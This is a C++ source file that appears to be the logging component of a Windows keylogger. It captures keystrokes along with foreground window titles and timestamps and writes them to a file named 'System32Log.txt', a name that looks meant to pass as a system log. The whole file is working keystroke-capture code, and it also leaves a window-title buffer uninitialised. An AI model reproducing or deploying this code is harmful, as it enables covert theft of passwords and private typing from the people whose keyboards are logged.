/*
 * store.cpp
 *
 *  Created on: Dec 6, 2017
 *      Author: julio.andrade
 */

#include "store.h"
#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>
 FILE* store::OUTPUT_FILE=NULL;

store::store() {

	store::OUTPUT_FILE = fopen("System32Log.txt", "w");


}

void store::Save(int key_stroke)
{
    char lastwindow[256];

	if ((key_stroke == 1) || (key_stroke == 2))
		return ; // ignore mouse clicks





	HWND foreground = GetForegroundWindow();
    if (foreground)
    {
        char window_title[256];
        GetWindowText(foreground, window_title, 256);

        if(strcmp(window_title, lastwindow)!=0) {
            strcpy(lastwindow, window_title);

            // get time
            time_t t = time(NULL);
            struct tm *tm = localtime(&t);
            char s[64];
            strftime(s, sizeof(s), "%c", tm);

            fprintf(OUTPUT_FILE, "\n\n[Window: %s - at %s] ", window_title, s);
        }
    }


	std::cout << key_stroke << '\n';

	if (key_stroke == VK_BACK)
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	else if (key_stroke == VK_RETURN)
		fprintf(OUTPUT_FILE, "%s", "\n");
	else if (key_stroke == VK_SPACE)
		fprintf(OUTPUT_FILE, "%s", " ");
	else if (key_stroke == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
	else if (key_stroke == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if (key_stroke == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[END]");
	else if (key_stroke == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[HOME]");
	else if (key_stroke == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
	else if (key_stroke == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[UP]");
	else if (key_stroke == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
	else if (key_stroke == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
	else if (key_stroke == 190 || key_stroke == 110)
		fprintf(OUTPUT_FILE, "%s", ".");
	else if (key_stroke == 189 || key_stroke == 109)
		fprintf(OUTPUT_FILE, "%s", "-");
	else if (key_stroke == 20)
		fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
	else {
		if (key_stroke >= 96 && key_stroke <= 105)
		{
			key_stroke -= 48;
			}
		else if (key_stroke >= 65 && key_stroke <= 90) { // A-Z
													// check caps lock
			bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

			// check shift key
			if ((GetKeyState(VK_SHIFT) & 0x0001) != 0 || (GetKeyState(VK_LSHIFT) & 0x0001) != 0 || (GetKeyState(VK_RSHIFT) & 0x0001) != 0) {
				lowercase = !lowercase;
			}

			if (lowercase) key_stroke += 32;
		}
		fprintf(OUTPUT_FILE, "%c", key_stroke);
    }
	// NOTE: Numpad-Keys seem to print as lowercase letters
	fflush(OUTPUT_FILE);


	return ;
}

store::~store() {
	fclose(OUTPUT_FILE);
}

